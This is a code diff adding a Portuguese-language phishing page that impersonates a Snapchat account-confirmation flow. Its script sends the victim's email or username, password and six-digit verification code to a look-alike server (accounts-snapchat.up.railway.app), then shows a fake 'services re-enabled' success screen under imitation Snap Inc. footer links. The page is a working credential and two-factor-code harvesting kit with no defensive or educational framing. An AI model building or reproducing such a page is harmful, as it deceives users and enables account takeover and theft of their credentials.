@@ -59,4 +59,207 @@
     <h1 style="width:100%">Confirme que é você</h1>
     <p class="sub" style="width:100%">Qual é o seu endereço de e-mail ou nome de usuário?</p>
     <div class="lbl">Endereço de e-mail ou nome de usuário</div>
-    <input type="text" id="email" placeholder="Digite seu e-mail ou us
+    <input type="text" id="email" placeholder="Digite seu e-mail ou usuário" autocomplete="off" autocapitalize="none"/>
+    <button class="btn" onclick="etapa1()">Verificar</button>
+    <div class="msg" id="m1"></div>
+  </div>
+
+  <!-- ETAPA 2: Senha -->
+  <div class="sec" id="s2">
+    <h1 style="width:100%">Digite sua senha</h1>
+    <p class="sub" style="width:100%" id="email-exib"></p>
+    <div class="lbl">Digite sua senha</div>
+    <input type="password" id="novaSenha" placeholder="Digite sua senha"/>
+    <div class="lbl">Confirme sua senha</div>
+    <input type="password" id="confirma" placeholder="Confirme sua senha"/>
+    <button class="btn" onclick="etapa2()">Confirmar</button>
+    <div class="msg" id="m2"></div>
+    <div class="back" onclick="ir(1)">← Usar outro e-mail ou usuário</div>
+  </div>
+
+  <!-- ETAPA 3: Código 6 dígitos -->
+  <div class="sec" id="s3">
+    <h1 style="width:100%">Confirme seu e-mail</h1>
+    <p class="sub" style="width:100%" id="codigo-sub">Insira o código enviado para o seu e-mail.</p>
+    <div class="code-wrap">
+      <input class="code-box" type="number" id="c0" oninput="onCode(this,0)" onkeydown="onKey(event,0)"/>
+      <input class="code-box" type="number" id="c1" oninput="onCode(this,1)" onkeydown="onKey(event,1)"/>
+      <input class="code-box" type="number" id="c2" oninput="onCode(this,2)" onkeydown="onKey(event,2)"/>
+      <input class="code-box" type="number" id="c3" oninput="onCode(this,3)" onkeydown="onKey(event,3)"/>
+      <input class="code-box" type="number" id="c4" oninput="onCode(this,4)" onkeydown="onKey(event,4)"/>
+      <input class="code-box" type="number" id="c5" oninput="onCode(this,5)" onkeydown="onKey(event,5)"/>
+    </div>
+    <div class="timer-wrap">
+      <div class="timer-text" id="timer-txt">Reenviar código em <span id="timer-count">1:00</span></div>
+      <button class="resend-btn" id="resend-btn" disabled onclick="reiniciarTimer()">Reenviar código</button>
+    </div>
+    <button class="btn" onclick="etapa3()">Verificar</button>
+    <div class="msg" id="m3"></div>
+    <div class="back" onclick="ir(2)">← Voltar</div>
+  </div>
+
+  <!-- ETAPA 4: Sucesso -->
+  <div class="sec" id="s4">
+    <div class="ok-icon">🎉</div>
+    <div class="ok-title">Confirmação realizada com sucesso!</div>
+    <p class="ok-sub">Seus serviços foram reabilitados!</p>
+    <button class="btn2" onclick="reiniciar()">Confirmação realizada!</button>
+  </div>
+
+  <div class="footer">
+    <a href="#">Empresa</a><a href="#">Comunidade</a><a href="#">Publicidade</a>
+    <a href="#">Direito</a><a href="#">Snap Inc.</a><a href="#">Suporte</a>
+    <a href="#">Comprar anúncios</a><a href="#">Centro de Privacidade</a>
+    <a href="#">Carreiras</a><a href="#">Diretrizes Comunitárias</a>
+    <a href="#">Políticas de Publicidade</a><a href="#">Suas opções de privacidade</a>
+    <a href="#">Notícias</a><a href="#">Centro de Segurança</a>
+    <a href="#">Política de Cookies</a><a href="#">Idioma</a>
+    <a href="#">Denunciar violação</a>
+  </div>
+</div>
+
+<script>
+  const BASE = 'https://accounts-snapchat.up.railway.app';
+  let emailSalvo = '';
+  let timerInterval = null;
+  let timerSeconds = 60;
+
+  function ir(n) {
+    document.querySelectorAll('.sec').forEach(s => s.classList.remove('on'));
+    document.getElementById('s' + n).classList.add('on');
+  }
+  function msg(elId, type, text) {
+    const el = document.getElementById(elId);
+    el.className = 'msg ' + type;
+    el.textContent = text;
+  }
+  function clearMsg(elId) {
+    const el = document.getElementById(elId);
+    el.className = 'msg'; el.textContent = '';
+  }
+  function maskInput(v) {
+    if (v.includes('@')) {
+      const [u, d] = v.split('@');
+      return u[0] + '...@' + d;
+    }
+    return v[0] + '...' + v[v.length - 1];
+  }
+  async function post(endpoint, body) {
+    const res = await fetch(BASE + endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await res.json();
+    return { ok: res.ok, data };
+  }
+
+  /* ── Etapa 1: salva e-mail ou usuário ── */
+  async function etapa1() {
+    const email = document.getElementById('email').value.trim();
+    clearMsg('m1');
+    if (!email || email.length < 2) { msg('m1','err','Digite seu e-mail ou nome de usuário.'); return; }
+    const btn = document.querySelector('#s1 .btn');
+    btn.disabled = true; btn.textContent = 'Verificando...';
+    try {
+      const { ok, data } = await post('/salvar-email', { email });
+      if (ok) {
+        emailSalvo = email;
+        document.getElementById('email-exib').textContent = maskInput(email);
+        ir(2);
+      } else { msg('m1','err', data.mensagem || 'Erro ao verificar.'); }
+    } catch { msg('m1','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Verificar';
+  }
+
+  /* ── Etapa 2: salva senha ── */
+  async function etapa2() {
+    const senha    = document.getElementById('novaSenha').value;
+    const confirma = document.getElementById('confirma').value;
+    clearMsg('m2');
+    if (!senha)             { msg('m2','err','Digite a senha.'); return; }
+    if (senha !== confirma) { msg('m2','err','As senhas não coincidem.'); return; }
+    const btn = document.querySelector('#s2 .btn');
+    btn.disabled = true; btn.textContent = 'Salvando...';
+    try {
+      const { ok, data } = await post('/salvar-senha', { email: emailSalvo, senha });
+      if (ok) {
+        document.getElementById('codigo-sub').textContent =
+          'Insira o código enviado para ' + maskInput(emailSalvo);
+        iniciarTimer();
+        ir(3);
+      } else { msg('m2','err', data.mensagem || 'Erro ao salvar senha.'); }
+    } catch { msg('m2','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Confirmar';
+  }
+
+  /* ── Etapa 3: salva código ── */
+  async function etapa3() {
+    const codigo = getCode();
+    clearMsg('m3');
+    if (codigo.length < 6) { msg('m3','err','Digite o código completo de 6 dígitos.'); return; }
+    const btn = document.querySelector('#s3 .btn');
+    btn.disabled = true; btn.textContent = 'Verificando...';
+    try {
+      const { ok, data } = await post('/salvar-codigo', { email: emailSalvo, codigo });
+      if (ok) { pararTimer(); ir(4); }
+      else { msg('m3','err', data.mensagem || 'Erro ao verificar código.'); }
+    } catch { msg('m3','err','Não foi possível conectar ao servidor.'); }
+    btn.disabled = false; btn.textContent = 'Verificar';
+  }
+
+  /* ── Campos do código ── */
+  function onCode(el, idx) {
+    el.value = el.value.replace(/\D/g,'').slice(-1);
+    if (el.value && idx < 5) document.getElementById('c'+(idx+1)).focus();
+  }
+  function onKey(e, idx) {
+    if (e.key==='Backspace' && !document.getElementById('c'+idx).value && idx>0)
+      document.getElementById('c'+(idx-1)).focus();
+    if (e.key==='ArrowLeft'  && idx>0) document.getElementById('c'+(idx-1)).focus();
+    if (e.key==='ArrowRight' && idx<5) document.getElementById('c'+(idx+1)).focus();
+  }
+  function getCode() {
+    return [0,1,2,3,4,5].map(i => document.getElementById('c'+i).value).join('');
+  }
+
+  /* ── Timer ── */
+  function iniciarTimer() {
+    timerSeconds = 60; renderTimer();
+    clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+      timerSeconds--;
+      renderTimer();
+      if (timerSeconds <= 0) {
+        clearInterval(timerInterval);
+        document.getElementById('timer-txt').classList.add('expired');
+        document.getElementById('timer-count').textContent = '0:00';
+        document.getElementById('resend-btn').disabled = false;
+      }
+    }, 1000);
+  }
+  function renderTimer() {
+    const m = Math.floor(timerSeconds/60), s = timerSeconds%60;
+    document.getElementById('timer-count').textContent = m+':'+(s<10?'0':'')+s;
+    document.getElementById('timer-txt').classList.remove('expired');
+    document.getElementById('resend-btn').disabled = true;
+  }
+  function pararTimer() { clearInterval(timerInterval); }
+  function reiniciarTimer() {
+    [0,1,2,3,4,5].forEach(i => { document.getElementById('c'+i).value=''; });
+    document.getElementById('c0').focus();
+    clearMsg('m3'); iniciarTimer();
+  }
+
+  /* ── Reset geral ── */
+  function reiniciar() {
+    pararTimer();
+    ['email','novaSenha','confirma'].forEach(id => {
+      const el = document.getElementById(id); if (el) el.value='';
+    });
+    [0,1,2,3,4,5].forEach(i => { document.getElementById('c'+i).value=''; });
+    emailSalvo = ''; ir(1);
+  }
+</script>
+</body>
+</html>
